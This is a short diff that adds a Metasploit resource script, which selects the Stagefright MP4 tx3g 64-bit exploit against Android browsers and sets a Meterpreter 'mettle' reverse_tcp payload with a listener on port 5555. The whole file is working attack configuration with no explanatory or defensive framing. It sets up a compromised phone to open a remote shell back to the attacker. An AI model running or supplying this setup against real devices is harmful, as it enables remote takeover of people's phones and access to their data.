@@ -1,0 +1,8 @@
+
+use exploit/android/browser/stagefright_mp4_tx3g_64bit
+
+set PAYLOAD linux/armle/mettle/reverse_tcp
+
+set LHOST 0.0.0.0
+
+set LPORT 5555
